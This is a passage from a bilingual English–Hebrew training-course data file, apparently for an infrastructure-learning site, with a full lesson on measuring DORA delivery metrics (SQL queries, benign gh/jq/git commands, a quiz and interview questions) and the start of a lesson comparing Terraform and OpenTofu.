    he: "המדדים של DORA מודדים throughput (תדירות deploy, lead time) ויציבות (change failure rate, זמן התאוששות, rework rate) ביחד; מחשבים אותם מ-git, מה-CI/CD ומדאטה של incidents, משתמשים בהם כדי למצוא צווארי בקבוק, ואף פעם לא הופכים אותם ליעדים אישיים."
  },
  analogy: {
    en: "A car dashboard shows speed and fuel and engine temperature together. A driver who watches only the speedometer will happily drive at 200 km/h until the engine melts; one who watches only temperature never leaves the parking lot. DORA puts speed (throughput) and engine health (stability) on the same dashboard — and the research finding is that good drivers get both.",
    he: "לוח מחוונים ברכב מראה מהירות, דלק וטמפרטורת מנוע ביחד. נהג שמסתכל רק על מד המהירות ייסע בשמחה 200 קמ\"ש עד שהמנוע יימס; נהג שמסתכל רק על הטמפרטורה לא יוצא מהחניה. DORA שם מהירות (throughput) ובריאות מנוע (יציבות) על אותו לוח — והממצא של המחקר הוא שנהגים טובים משיגים את שניהם."
  },
  sections: [
    {
      h: { en: "The keys: throughput and stability", he: "המדדים: throughput ויציבות" },
      body: {
        en: `<p>DORA (DevOps Research and Assessment, now part of Google Cloud) has surveyed tens of thousands of professionals since 2014 (the book <em>Accelerate</em>, 2018). The core metrics:</p>
<table>
<tr><th>Metric</th><th>Question</th><th>Type</th></tr>
<tr><td><strong>Deployment frequency</strong></td><td>How often do we deploy to production?</td><td>throughput</td></tr>
<tr><td><strong>Lead time for changes</strong></td><td>Commit → running in production, how long?</td><td>throughput</td></tr>
<tr><td><strong>Change failure rate</strong></td><td>What % of deployments cause a failure needing remediation (rollback, hotfix, incident)?</td><td>stability</td></tr>
<tr><td><strong>Failed deployment recovery time</strong></td><td>When a deploy breaks prod, how long to restore? (was "MTTR / time to restore"; renamed in 2023 to exclude non-deploy outages like a cloud region failure)</td><td>stability</td></tr>
<tr><td><strong>Rework rate</strong> (added 2024)</td><td>What share of deployments are unplanned, done to fix a user-facing bug?</td><td>stability</td></tr>
</table>
<p>DORA also tracks <strong>reliability</strong> (meeting your SLOs) as the operational counterpart since 2021: you can deploy perfectly and still run an unreliable service.</p>
<p>The central finding, repeated every year: throughput and stability are <strong>not</strong> a trade-off. Teams that deploy more often in smaller batches also fail less and recover faster, because small changes are easy to review, test and revert.</p>`,
        he: `<p>DORA (DevOps Research and Assessment, היום חלק מ-Google Cloud) סוקרים עשרות אלפי אנשי מקצוע מאז 2014 (הספר <em>Accelerate</em>, 2018). המדדים המרכזיים:</p>
<table>
<tr><th>מדד</th><th>השאלה</th><th>סוג</th></tr>
<tr><td><strong>Deployment frequency</strong></td><td>כמה פעמים אנחנו עושים deploy לפרוד?</td><td>throughput</td></tr>
<tr><td><strong>Lead time for changes</strong></td><td>מ-commit ועד שזה רץ בפרוד — כמה זמן?</td><td>throughput</td></tr>
<tr><td><strong>Change failure rate</strong></td><td>כמה אחוז מה-deploys גורמים לתקלה שדורשת תיקון (rollback, hotfix, incident)?</td><td>יציבות</td></tr>
<tr><td><strong>Failed deployment recovery time</strong></td><td>כש-deploy שובר את פרוד, כמה זמן לוקח לשחזר? (פעם "MTTR / time to restore"; השם שונה ב-2023 כדי להוציא תקלות שלא קשורות ל-deploy, כמו נפילה של region בענן)</td><td>יציבות</td></tr>
<tr><td><strong>Rework rate</strong> (נוסף ב-2024)</td><td>איזה חלק מה-deploys הם לא מתוכננים, ונעשים כדי לתקן באג שמשתמשים רואים?</td><td>יציבות</td></tr>
</table>
<p>מאז 2021 DORA עוקבים גם אחרי <strong>reliability</strong> (עמידה ב-SLOs) בתור הצד התפעולי: אפשר לעשות deploy מושלם ועדיין להריץ שירות לא אמין.</p>
<p>הממצא המרכזי, שחוזר כל שנה: throughput ויציבות הם <strong>לא</strong> trade-off. צוותים שעושים deploy יותר פעמים ובמנות קטנות יותר גם נכשלים פחות ומתאוששים מהר יותר, כי שינויים קטנים קל לעבור עליהם, לבדוק ולהחזיר.</p>`
      }
    },
    {
      h: { en: "Benchmarks: elite vs low", he: "Benchmarks: elite מול low" },
      body: {
        en: `<p>The 2024 State of DevOps report clusters (the medium/high rows famously cross on change failure rate — medium teams failed less but deployed far less):</p>
<table>
<tr><th></th><th>Elite</th><th>High</th><th>Medium</th><th>Low</th></tr>
<tr><td>Deploy frequency</td><td>on demand (many/day)</td><td>daily – weekly</td><td>weekly – monthly</td><td>monthly – every 6 months</td></tr>
<tr><td>Lead time</td><td>&lt; 1 day</td><td>1 day – 1 week</td><td>1 week – 1 month</td><td>1 – 6 months</td></tr>
<tr><td>Change failure rate</td><td>~5%</td><td>~20%</td><td>~10%</td><td>~40%</td></tr>
<tr><td>Recovery time</td><td>&lt; 1 hour</td><td>&lt; 1 day</td><td>&lt; 1 day</td><td>1 week – 1 month</td></tr>
</table>
<p>About 19% of respondents were elite in 2024 and 25% low. The 2025 report (focused on AI-assisted development) moved away from the four-tier ranking toward richer team profiles that also include well-being and friction — a signal that the metrics are a diagnosis tool, not a league table.</p>
<blockquote>💡 Real world: compare a team with its own past, not with Google. A regulated bank going from quarterly to weekly releases with a 15% → 8% failure rate is a huge win even if it is "medium" on the chart.</blockquote>`,
        he: `<p>ה-clusters מדוח State of DevOps של 2024 (השורות של medium ו-high מתהפכות ב-change failure rate, וזה מפורסם — צוותי medium נכשלו פחות אבל עשו הרבה פחות deploys):</p>
<table>
<tr><th></th><th>Elite</th><th>High</th><th>Medium</th><th>Low</th></tr>
<tr><td>תדירות deploy</td><td>on demand (הרבה ביום)</td><td>יומי – שבועי</td><td>שבועי – חודשי</td><td>חודשי – כל חצי שנה</td></tr>
<tr><td>Lead time</td><td>&lt; יום</td><td>יום – שבוע</td><td>שבוע – חודש</td><td>1 – 6 חודשים</td></tr>
<tr><td>Change failure rate</td><td>~5%</td><td>~20%</td><td>~10%</td><td>~40%</td></tr>
<tr><td>זמן התאוששות</td><td>&lt; שעה</td><td>&lt; יום</td><td>&lt; יום</td><td>שבוע – חודש</td></tr>
</table>
<p>בערך 19% מהמשיבים היו elite ב-2024, ו-25% היו low. הדוח של 2025 (שהתמקד בפיתוח בעזרת AI) התרחק מהדירוג בארבע רמות לטובת פרופילים עשירים יותר של צוותים שכוללים גם well-being וחיכוך — סימן לכך שהמדדים הם כלי אבחון, לא טבלת ליגה.</p>
<blockquote>💡 Real world: תשווה צוות לעבר של עצמו, לא לגוגל. בנק תחת רגולציה שעובר משחרור רבעוני לשבועי, עם ירידה ב-failure rate מ-15% ל-8%, זה ניצחון ענק גם אם בטבלה הוא "medium".</blockquote>`
      }
    },
    {
      h: { en: "Computing them from real data", he: "לחשב אותם מדאטה אמיתי" },
      body: {
        en: `<p>You need three event streams joined by commit SHA: <strong>changes</strong> (git: commit/PR merge times), <strong>deployments</strong> (CD: which SHA reached prod when, success/failure) and <strong>incidents</strong> (pager/incident tool: start, resolve, linked deploy). Google's open-source Four Keys project did exactly this with webhooks → BigQuery; commercial tools (DX, LinearB, Sleuth, Swarmia, GitLab/GitHub insights) do the same.</p>
<pre>-- Lead time for changes (median, last 30 days)
-- every commit in a deployment gets lead_time = deployed_at - committed_at
SELECT APPROX_QUANTILES(TIMESTAMP_DIFF(d.deployed_at, c.committed_at, MINUTE), 100)[OFFSET(50)] AS p50_min,
       APPROX_QUANTILES(TIMESTAMP_DIFF(d.deployed_at, c.committed_at, MINUTE), 100)[OFFSET(90)] AS p90_min
FROM deployments d
JOIN deployment_commits dc ON dc.deploy_id = d.id
JOIN commits c ON c.sha = dc.sha
WHERE d.env = 'prod' AND d.status = 'success'
  AND d.deployed_at &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 DAY);

-- Change failure rate
SELECT COUNTIF(caused_failure) / COUNT(*) AS cfr      -- caused_failure: rolled back, hotfixed,
FROM deployments                                      -- or linked to an incident
WHERE env = 'prod' AND deployed_at &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 DAY);</pre>
<ul>
<li><strong>Deployment frequency</strong>: count successful prod deploys per service per day/week; report the median day, not the total across 300 microservices (one chatty service inflates it).</li>
<li><strong>Lead time</strong>: use medians and p90, not means — one 3-month-old commit dominates an average. Break it into stages: coding (first commit → PR open), pickup (open → first review), review (first review → merge), deploy (merge → prod). The stage breakdown is where the action is.</li>
<li><strong>Change failure rate</strong>: requires linking a remediation back to the deploy that caused it — tag rollbacks and hotfixes in the pipeline, and add a "caused by deploy" field in your incident template.</li>
<li><strong>Recovery time</strong>: incident start (detection or first impact) → service restored, for deploy-caused incidents only.</li>
</ul>`,
        he: `<p>צריך שלושה זרמי events שמחוברים לפי commit SHA: <strong>changes</strong> (git: זמני commit ו-merge של PR), <strong>deployments</strong> (CD: איזה SHA הגיע לפרוד ומתי, הצלחה או כישלון) ו-<strong>incidents</strong> (כלי ה-pager או ה-incidents: התחלה, סגירה, deploy מקושר). הפרויקט ה-open source של גוגל, Four Keys, עשה בדיוק את זה עם webhooks ל-BigQuery; כלים מסחריים (DX, LinearB, Sleuth, Swarmia, ה-insights של GitLab ו-GitHub) עושים אותו דבר.</p>
<pre>-- Lead time for changes (median, last 30 days)
-- every commit in a deployment gets lead_time = deployed_at - committed_at
SELECT APPROX_QUANTILES(TIMESTAMP_DIFF(d.deployed_at, c.committed_at, MINUTE), 100)[OFFSET(50)] AS p50_min,
       APPROX_QUANTILES(TIMESTAMP_DIFF(d.deployed_at, c.committed_at, MINUTE), 100)[OFFSET(90)] AS p90_min
FROM deployments d
JOIN deployment_commits dc ON dc.deploy_id = d.id
JOIN commits c ON c.sha = dc.sha
WHERE d.env = 'prod' AND d.status = 'success'
  AND d.deployed_at &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 DAY);

-- Change failure rate
SELECT COUNTIF(caused_failure) / COUNT(*) AS cfr      -- caused_failure: rolled back, hotfixed,
FROM deployments                                      -- or linked to an incident
WHERE env = 'prod' AND deployed_at &gt; TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 DAY);</pre>
<ul>
<li><strong>Deployment frequency</strong>: סופרים deploys מוצלחים לפרוד לכל שירות ביום או בשבוע; מדווחים את החציון, לא את הסכום על פני 300 microservices (שירות אחד פטפטן מנפח את המספר).</li>
<li><strong>Lead time</strong>: משתמשים בחציון וב-p90, לא בממוצע — commit אחד בן 3 חודשים משתלט על ממוצע. מפרקים לשלבים: coding (commit ראשון עד פתיחת PR), pickup (פתיחה עד review ראשון), review (review ראשון עד merge), deploy (merge עד פרוד). הפירוק לשלבים הוא המקום שבו נמצאת העבודה האמיתית.</li>
<li><strong>Change failure rate</strong>: דורש לקשר תיקון בחזרה ל-deploy שגרם לבעיה — מתייגים rollbacks ו-hotfixes ב-pipeline, ומוסיפים שדה "caused by deploy" בתבנית ה-incident.</li>
<li><strong>Recovery time</strong>: מתחילת ה-incident (זיהוי או השפעה ראשונה) ועד שהשירות חזר, רק ל-incidents שנגרמו מ-deploy.</li>
</ul>`
      }
    },
    {
      h: { en: "Beyond DORA: SPACE, DevEx — and Goodhart", he: "מעבר ל-DORA: SPACE, DevEx — ו-Goodhart" },
      body: {
        en: `<p>DORA measures the delivery pipeline, not whether engineers are productive or burning out. Two complementary frameworks:</p>
<ul>
<li><strong>SPACE</strong> (Forsgren, Storey et al., 2021): <strong>S</strong>atisfaction &amp; well-being, <strong>P</strong>erformance (outcomes), <strong>A</strong>ctivity (counts — PRs, deploys), <strong>C</strong>ommunication &amp; collaboration, <strong>E</strong>fficiency &amp; flow. Rule: pick metrics from at least three dimensions, and mix system data with surveys.</li>
<li><strong>DevEx</strong> (Noda, Storey, Forsgren, Greiler, 2023): three levers — <strong>feedback loops</strong> (CI time, review latency, deploy time), <strong>cognitive load</strong> (how hard is it to understand and change things), <strong>flow state</strong> (uninterrupted focus time). Measured largely by quarterly developer surveys, cross-checked against telemetry.</li>
</ul>
<p><strong>Goodhart's law</strong>: "when a measure becomes a target, it ceases to be a good measure". Make deployment frequency a team OKR and you get empty deploys; reward low change failure rate and people stop calling things incidents; count PRs per engineer and PRs get split into confetti. Rules that keep metrics honest:</p>
<ul>
<li>Team-level only — never stack-rank individuals on DORA or PR counts.</li>
<li>Always pair a throughput metric with a stability metric.</li>
<li>Use them to ask "where is the bottleneck?", and let the team that owns the system own the dashboard.</li>
</ul>
<blockquote>⚠️ Production tip: AI coding assistants raise activity metrics (more code, more PRs) quickly. The 2024 and 2025 DORA reports found that higher AI adoption could coincide with lower delivery stability when batch sizes grew — watch PR size and change failure rate, not lines of code.</blockquote>`,
        he: `<p>DORA מודד את ה-pipeline של ה-delivery, לא אם המהנדסים פרודוקטיביים או נשחקים. שתי מסגרות משלימות:</p>
<ul>
<li><strong>SPACE</strong> (Forsgren, Storey ואחרים, 2021): <strong>S</strong>atisfaction &amp; well-being, <strong>P</strong>erformance (תוצאות), <strong>A</strong>ctivity (ספירות — PR-ים, deploys), <strong>C</strong>ommunication &amp; collaboration, <strong>E</strong>fficiency &amp; flow. הכלל: לבחור מדדים מלפחות שלושה ממדים, ולשלב דאטה מהמערכות עם סקרים.</li>
<li><strong>DevEx</strong> (Noda, Storey, Forsgren, Greiler, 2023): שלושה מנופים — <strong>feedback loops</strong> (זמן CI, זמן המתנה ל-review, זמן deploy), <strong>cognitive load</strong> (כמה קשה להבין ולשנות דברים), <strong>flow state</strong> (זמן ריכוז בלי הפרעות). נמדד בעיקר בסקרי מפתחים רבעוניים, שמוצלבים עם טלמטריה.</li>
</ul>
<p><strong>Goodhart's law</strong>: "כשמדד הופך ליעד, הוא מפסיק להיות מדד טוב". תהפוך את תדירות ה-deploy ל-OKR של הצוות ותקבל deploys ריקים; תתגמל change failure rate נמוך ואנשים יפסיקו לקרוא לדברים incidents; תספור PR-ים לכל מהנדס וה-PR-ים יתפרקו לקונפטי. כללים ששומרים על המדדים כנים:</p>
<ul>
<li>רק ברמת הצוות — אף פעם לא לדרג אנשים לפי DORA או מספר PR-ים.</li>
<li>תמיד לזווג מדד throughput עם מדד יציבות.</li>
<li>להשתמש בהם כדי לשאול "איפה צוואר הבקבוק?", ולתת לצוות שמחזיק את המערכת להחזיק גם את ה-dashboard.</li>
</ul>
<blockquote>⚠️ Production tip: עוזרי קוד מבוססי AI מעלים מהר את מדדי ה-activity (יותר קוד, יותר PR-ים). הדוחות של DORA מ-2024 ו-2025 מצאו שאימוץ AI גבוה יכול ללכת יחד עם יציבות delivery נמוכה יותר כשגודל המנות גדל — תסתכל על גודל PR ועל change failure rate, לא על שורות קוד.</blockquote>`
      }
    },
    {
      h: { en: "Levers that actually cut lead time", he: "המנופים שבאמת מקצרים lead time" },
      body: {
        en: `<p>A typical breakdown for a team with a 4-day median lead time: coding 1.2 days, <strong>waiting for first review 1.6 days</strong>, review 0.4 days, merge → prod 0.8 days (nightly deploy + manual approval). The biggest box is usually waiting, not working.</p>
<table>
<tr><th>Bottleneck</th><th>Lever</th><th>Typical effect</th></tr>
<tr><td>Big PRs</td><td>PR size norm (≈ &lt;400 changed lines), stacked diffs, feature flags</td><td>review time drops sharply; review quality rises</td></tr>
<tr><td>Review pickup</td><td>review SLA (e.g. first response &lt; 4 working hours), CODEOWNERS with rotations, Slack nudges</td><td>pickup from days to hours</td></tr>
<tr><td>Slow CI</td><td>caching, sharding, test impact analysis, faster runners; target p90 &lt; 10 min</td><td>fewer context switches, smaller batches</td></tr>
<tr><td>Flaky tests</td><td>quarantine + owner + fix SLA; track flake rate</td><td>no more "re-run until green"</td></tr>
<tr><td>Batched deploys</td><td>deploy on every merge, merge queue, automated canary instead of manual approval</td><td>merge → prod from a day to under an hour</td></tr>
<tr><td>Change approval board</td><td>replace with peer review + automated policy checks (DORA found heavyweight CABs correlate with worse performance)</td><td>removes multi-day waits</td></tr>
</table>
<blockquote>💡 Real world: start by measuring one thing for two weeks — PR open → merge time by stage. Most teams discover a single dominant wait state, fix it in a month, and only then need a full metrics platform.</blockquote>`,
        he: `<p>פירוק טיפוסי לצוות עם lead time חציוני של 4 ימים: coding 1.2 ימים, <strong>המתנה ל-review ראשון 1.6 ימים</strong>, review 0.4 ימים, מ-merge לפרוד 0.8 ימים (deploy לילי + אישור ידני). הקופסה הכי גדולה היא בדרך כלל המתנה, לא עבודה.</p>
<table>
<tr><th>צוואר בקבוק</th><th>מנוף</th><th>השפעה טיפוסית</th></tr>
<tr><td>PR-ים גדולים</td><td>נורמה לגודל PR (בערך פחות מ-400 שורות), stacked diffs, feature flags</td><td>זמן ה-review יורד חזק; האיכות שלו עולה</td></tr>
<tr><td>Review pickup</td><td>SLA ל-review (למשל תגובה ראשונה תוך 4 שעות עבודה), CODEOWNERS עם רוטציה, תזכורות ב-Slack</td><td>pickup מימים לשעות</td></tr>
<tr><td>CI איטי</td><td>caching, sharding, test impact analysis, runners מהירים יותר; יעד p90 מתחת ל-10 דקות</td><td>פחות context switches, מנות קטנות יותר</td></tr>
<tr><td>Flaky tests</td><td>quarantine + בעלים + SLA לתיקון; למדוד flake rate</td><td>נגמר ה-"להריץ שוב עד שיהיה ירוק"</td></tr>
<tr><td>Deploys במנות</td><td>deploy על כל merge, merge queue, canary אוטומטי במקום אישור ידני</td><td>מ-merge לפרוד — מיום לפחות משעה</td></tr>
<tr><td>Change approval board</td><td>להחליף ב-peer review + בדיקות policy אוטומטיות (DORA מצאו ש-CAB כבד מתואם עם ביצועים גרועים יותר)</td><td>מוריד המתנות של כמה ימים</td></tr>
</table>
<blockquote>💡 Real world: תתחיל במדידה של דבר אחד במשך שבועיים — הזמן מפתיחת PR עד merge, מפורק לשלבים. רוב הצוותים מגלים מצב המתנה דומיננטי אחד, מתקנים אותו תוך חודש, ורק אז צריכים פלטפורמת מדדים מלאה.</blockquote>`
      }
    }
  ],
  diagram: "commit --coding--> PR open --pickup--> 1st review --review--> merge --deploy--> prod\n   |____________________________ lead time for changes ____________________________|\ndeploys/day (throughput)      failed deploys / deploys = CFR (stability)\nincident start -> restored = failed deployment recovery time",
  handsOn: [
    { cmd: "gh pr list --state merged --limit 200 --json number,createdAt,mergedAt,additions,deletions > prs.json", what: { en: "Pull merge data for the last 200 PRs to compute open → merge time and PR size distribution.", he: "למשוך נתוני merge של 200 ה-PR-ים האחרונים כדי לחשב זמן מפתיחה ל-merge והתפלגות גודל PR." } },
    { cmd: "jq '[.[] | ((.mergedAt|fromdate) - (.createdAt|fromdate))/3600] | sort | .[length/2|floor]' prs.json", what: { en: "Median hours from PR open to merge — the single most useful lead-time slice to start with.", he: "חציון השעות מפתיחת PR ועד merge — הפרוסה הכי שימושית של lead time להתחיל איתה." } },
    { cmd: "gh api 'repos/acme/api/deployments?environment=production&per_page=100' --jq '.[].created_at'", what: { en: "List production deployments recorded by GitHub environments to count deployment frequency.", he: "להציג את ה-deployments לפרוד ש-GitHub environments רשם, כדי לספור תדירות deploy." } },
    { cmd: "git log --since='30 days ago' --merges --first-parent main --format='%h %cI' | wc -l", what: { en: "Rough merge frequency into main over 30 days — a proxy for trunk-based behavior.", he: "הערכה גסה של תדירות ה-merge ל-main ב-30 יום — אינדיקציה להתנהגות trunk-based." } }
  ],
  mnemonic: {
    en: "Two for speed, two for safety (plus rework) — measure the team, never the person, and the biggest box is waiting.",
    he: "שניים למהירות, שניים לבטיחות (ועוד rework) — מודדים צוות, אף פעם לא אדם, והקופסה הכי גדולה היא המתנה."
  },
  pitfalls: [
    { en: "Averaging lead time: a handful of ancient commits make the mean meaningless. Use median and p90 and break it into stages.", he: "לחשב ממוצע של lead time: כמה commits עתיקים הופכים את הממוצע לחסר משמעות. משתמשים בחציון וב-p90 ומפרקים לשלבים." },
    { en: "Counting a rollback as 'not a failure' because no incident was declared — CFR then measures your paperwork discipline, not quality.", he: "לא לספור rollback ככישלון כי לא הוכרז incident — ואז ה-CFR מודד את משמעת הניירת שלך, לא את האיכות." },
    { en: "Publishing per-engineer DORA or PR-count leaderboards. People optimize the number within weeks and trust collapses.", he: "לפרסם טבלאות דירוג של DORA או מספר PR-ים לכל מהנדס. תוך שבועות אנשים מבצעים אופטימיזציה למספר והאמון קורס." },
    { en: "Measuring only throughput after adopting AI tools: more PRs with bigger diffs can push change failure rate up while activity charts look great.", he: "למדוד רק throughput אחרי אימוץ כלי AI: יותר PR-ים עם diffs גדולים יותר יכולים להעלות את ה-change failure rate בזמן שגרפי ה-activity נראים מעולה." }
  ],
  interview: [
    {
      q: { en: "Leadership wants to use DORA metrics to rank teams. What do you advise?", he: "ההנהלה רוצה להשתמש במדדי DORA כדי לדרג צוותים. מה אתה ממליץ?" },
      a: { en: "Use them to find system bottlenecks and track each team against its own baseline, not to rank. Teams differ in context (a mobile app with store review vs a stateless API). Ranking triggers Goodhart: empty deploys, under-reported incidents. Pair throughput with stability, add a quarterly DevEx survey, and fund the platform work the data points to (CI speed, review latency).", he: "להשתמש בהם כדי למצוא צווארי בקבוק במערכת ולעקוב אחרי כל צוות מול ה-baseline של עצמו, לא כדי לדרג. לצוותים יש הקשרים שונים (אפליקציית mobile עם review של חנות מול API stateless). דירוג מפעיל את Goodhart: deploys ריקים, incidents שלא מדווחים. לזווג throughput עם יציבות, להוסיף סקר DevEx רבעוני, ולממן את עבודת ה-platform שהדאטה מצביע עליה (מהירות CI, זמן המתנה ל-review)." }
    },
    {
      q: { en: "How do you compute change failure rate in practice?", he: "איך מחשבים change failure rate בפועל?" },
      a: { en: "Denominator: successful production deployments in the window. Numerator: those deployments that needed remediation — rolled back, followed by a hotfix, or linked as cause of an incident. Make the link automatic where possible (pipeline tags rollbacks/hotfixes with the original deploy id) and add a required 'caused by deploy' field in incident postmortems.", he: "מכנה: deploys מוצלחים לפרוד בחלון הזמן. מונה: ה-deploys מתוכם שדרשו תיקון — עשו להם rollback, הגיע אחריהם hotfix, או שקושרו כגורם ל-incident. הופכים את הקישור לאוטומטי איפה שאפשר (ה-pipeline מתייג rollbacks ו-hotfixes עם ה-id של ה-deploy המקורי) ומוסיפים שדה חובה 'caused by deploy' ב-postmortems." }
    }
  ],
  quiz: [
    {
      q: { en: "Which pair are DORA's throughput metrics?", he: "איזה זוג הם מדדי ה-throughput של DORA?" },
      options: [
        { en: "Change failure rate and recovery time", he: "Change failure rate וזמן התאוששות" },
        { en: "Deployment frequency and lead time for changes", he: "Deployment frequency ו-lead time for changes" },
        { en: "Lines of code and PR count", he: "שורות קוד ומספר PR-ים" },
        { en: "Uptime and latency", he: "Uptime ו-latency" }
      ],
      answer: 1,
      explain: { en: "Throughput = how fast changes flow (frequency, lead time). Stability = how often they break and how fast you recover (CFR, recovery time, rework rate).", he: "Throughput = כמה מהר שינויים זורמים (תדירות, lead time). יציבות = כמה פעמים הם שוברים וכמה מהר מתאוששים (CFR, זמן התאוששות, rework rate)." }
    },
    {
      q: { en: "Why did DORA rename 'time to restore service' to 'failed deployment recovery time'?", he: "למה DORA שינו את השם 'time to restore service' ל-'failed deployment recovery time'?" },
      options: [
        { en: "To include all outages, including cloud provider failures", he: "כדי לכלול את כל התקלות, גם נפילות של ספק הענן" },
        { en: "To focus on recovering from failures caused by your own changes, excluding unrelated outages", he: "כדי להתמקד בהתאוששות מתקלות שנגרמו מהשינויים שלך, בלי תקלות שלא קשורות" },
        { en: "Because MTTR was trademarked", he: "כי MTTR הוא סימן רשום" },
        { en: "To measure time to detect instead", he: "כדי למדוד במקום זה זמן זיהוי" }
      ],
      answer: 1,
      explain: { en: "The metric is about the delivery process: how quickly you recover when a deployment goes wrong. A region outage says little about your pipeline.", he: "המדד עוסק בתהליך ה-delivery: כמה מהר מתאוששים כש-deploy משתבש. נפילה של region אומרת מעט מאוד על ה-pipeline שלך." }
    },
    {
      q: { en: "A team's median lead time is 4 days; 1.6 days are 'waiting for first review'. Best first lever?", he: "ה-lead time החציוני של צוות הוא 4 ימים; 1.6 ימים מתוכם הם 'המתנה ל-review ראשון'. מה המנוף הראשון הכי טוב?" },
      options: [
        { en: "Buy faster CI runners", he: "לקנות runners מהירים יותר ל-CI" },
        { en: "Add a manual QA stage", he: "להוסיף שלב QA ידני" },
        { en: "Review SLA, smaller PRs and CODEOWNERS rotations", he: "SLA ל-review, PR-ים קטנים יותר ורוטציה ב-CODEOWNERS" },
        { en: "Set a deploys-per-engineer target", he: "לקבוע יעד deploys לכל מהנדס" }
      ],
      answer: 2,
      explain: { en: "Attack the largest stage. Pickup latency is a social/process bottleneck: smaller PRs are picked up faster, and an explicit review SLA with rotations removes 'someone else will review it'.", he: "תוקפים את השלב הכי גדול. זמן ה-pickup הוא צוואר בקבוק חברתי ותהליכי: PR-ים קטנים נלקחים מהר יותר, ו-SLA מפורש ל-review עם רוטציה מעלים את ה-'מישהו אחר כבר יעשה review'." }
    },
    {
      q: { en: "Which is a Goodhart failure?", he: "מה מהבאים הוא כישלון של Goodhart?" },
      options: [
        { en: "Tracking CFR alongside deploy frequency", he: "לעקוב אחרי CFR לצד תדירות deploy" },
        { en: "A bonus tied to deploys/week, followed by a spike in no-op deploys", he: "בונוס שקשור ל-deploys בשבוע, ואחריו קפיצה ב-deploys שלא משנים כלום" },
        { en: "Comparing a team to its own baseline", he: "להשוות צוות ל-baseline של עצמו" },
        { en: "Surveying developers about friction", he: "לסקור מפתחים לגבי חיכוך" }
      ],
      answer: 1,
      explain: { en: "Once the number is the target, people move the number instead of the outcome it was meant to reflect.", he: "ברגע שהמספר הוא היעד, אנשים מזיזים את המספר במקום את התוצאה שהוא אמור לשקף." }
    }
  ],
  related: ["cloud-cicd", "release-engineering", "rel-incident-management", "staff-platform-engineering", "pr-code-review-quality"]
});

/* ------------------------------------------------------------------ 4. The IaC landscape */
window.INFRA.lessons.push({
  id: "iac-landscape",
  track: "cloud",
  order: 63,
  icon: "🗺️",
  level: 3,
  minutes: 15,
  title: { en: "The IaC Landscape: Terraform, OpenTofu, Pulumi, CDK, Crossplane, Bicep, Ansible", he: "מפת ה-IaC: Terraform, OpenTofu, Pulumi, CDK, Crossplane, Bicep, Ansible" },
  tldr: {
    en: "Pick an IaC tool by who writes it and how it reconciles: HCL plan/apply (Terraform/OpenTofu), general-purpose code (Pulumi, AWS CDK), cloud-native templates with no state file (Bicep, CloudFormation), or a continuously reconciling Kubernetes control plane (Crossplane) — and keep configuration management (Ansible) for what runs inside the machines.",
    he: "בוחרים כלי IaC לפי מי כותב אותו ואיך הוא עושה reconcile: HCL עם plan/apply (Terraform/OpenTofu), קוד בשפה רגילה (Pulumi, AWS CDK), templates של הענן עצמו בלי קובץ state (Bicep, CloudFormation), או control plane של Kubernetes שעושה reconcile כל הזמן (Crossplane) — ומשאירים configuration management (Ansible) למה שרץ בתוך המכונות."
  },
  analogy: {
    en: "Building a house. Terraform is an architect's blueprint plus a contractor you call when you want changes: he compares the plan to the house and does the diff. Pulumi and CDK let you write the blueprint in a real programming language. Crossplane is a full-time building manager who walks the house every minute and puts back anything that doesn't match the plan. Ansible is the interior decorator: it doesn't pour foundations, it configures what's inside the rooms.",
    he: "בניית בית. Terraform זה תוכנית של אדריכל ועוד קבלן שאתה מזמין כשאתה רוצה שינוי: הוא משווה את התוכנית לבית ועושה את ה-diff. Pulumi ו-CDK נותנים לך לכתוב את התוכנית בשפת תכנות אמיתית. Crossplane זה אב בית במשרה מלאה שמסתובב בבית כל דקה ומחזיר למקום כל מה שלא מתאים לתוכנית. Ansible זה מעצב הפנים: הוא לא יוצק יסודות, הוא מגדיר את מה שבתוך החדרים."
  },
  sections: [
    {
      h: { en: "Terraform vs OpenTofu: the license story", he: "Terraform מול OpenTofu: סיפור הרישיון" },
      body: {
        en: `<p>In August 2023 HashiCorp moved Terraform (from 1.6) from the open-source MPL 2.0 to the <strong>Business Source License 1.1</strong>: free to use, but you may not offer a product that competes with HashiCorp's commercial offerings. Vendors like Spacelift, env0, Gruntwork and Harness forked the last MPL version as <strong>OpenTofu</strong> under the Linux Foundation; OpenTofu 1.6.0 went GA in January 2024 and the project later joined the CNCF. IBM completed its acquisition of HashiCorp in early 2025.</p>
<p>Practically, for most end users running Terraform internally, the BSL changes nothing legally. The choice is about governance and features:</p>
<table>
<tr><th></th><th>Terraform (HashiCorp/IBM)</th><th>OpenTofu (Linux Foundation)</th></tr>
<tr><td>License</td><td>BSL 1.1</td><td>MPL 2.0</td></tr>
<tr><td>Ecosystem</td><td>HCP Terraform, Stacks, Sentinel, registry.terraform.io</td><td>registry.opentofu.org mirrors the same providers</td></tr>
<tr><td>Notable features</td><td>ephemeral resources, write-only attributes, Terraform Stacks</td><td>native state encryption (1.7), <code>for_each</code> on providers, <code>-exclude</code>, early variable evaluation in backends/module sources</td></tr>
<tr><td>Migration</td><td colspan="2">drop-in for 1.5.x/1.6.x configs: <code>tofu init</code> reads the same state; diverging features make going back harder over time</td></tr>
</table>
<p>Both use the same providers (the AWS/Azure/Google providers are MPL), the same HCL and the same state format at the fork point.</p>
<blockquote>💡 Real world: teams that build an internal platform product on top of Terraform, or want state encryption without a commercial backend, tend to pick OpenTofu; teams on HCP Terraform with Sentinel policies tend to stay. Either way, pin the binary version in CI (<code>required_version</code>) — never let laptops and pipelines run different versions.</blockquote>`,
        he: `<p>באוגוסט 2023 HashiCorp העבירו את Terraform (מגרסה 1.6) מרישיון ה-open source MPL 2.0 ל-<strong>Business Source License 1.1</strong>: חינם לשימוש, אבל אסור להציע מוצר שמתחרה בהצעות המסחריות של HashiCorp. ספקים כמו Spacelift, env0, Gruntwork ו-Harness עשו fork לגרסת ה-MPL האחרונה בשם <strong>OpenTofu</strong> תחת ה-Linux Foundation; OpenTofu 1.6.0 יצא ל-GA בינואר 2024 והפרויקט הצטרף מאוחר יותר ל-CNCF. IBM השלימה את הרכישה של HashiCorp בתחילת 2025.</p>
<p>בפועל, לרוב משתמשי הקצה שמריצים Terraform בתוך הארגון, ה-BSL לא משנה כלום מבחינה משפטית. הבחירה היא על governance ועל features:</p>
<table>
